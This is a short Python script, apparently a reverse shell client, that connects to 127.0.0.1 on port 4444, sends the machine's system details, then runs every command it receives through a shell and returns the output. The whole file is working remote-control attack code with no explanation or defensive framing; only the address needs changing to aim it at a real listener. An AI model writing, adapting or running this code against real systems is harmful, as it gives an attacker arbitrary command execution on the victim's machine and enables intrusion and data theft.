from socket import *
import platform
import subprocess as sub


s = socket(2,1)
s.connect(("127.0.0.1",4444))

print("connected")

uname = platform.uname()

s.send((str(uname)).encode())

while True :
    Command = s.recv(12345).decode()
    cmd = sub.check_output(Command,shell=True).decode()
    s.send(str(cmd).encode())
    


s.close()
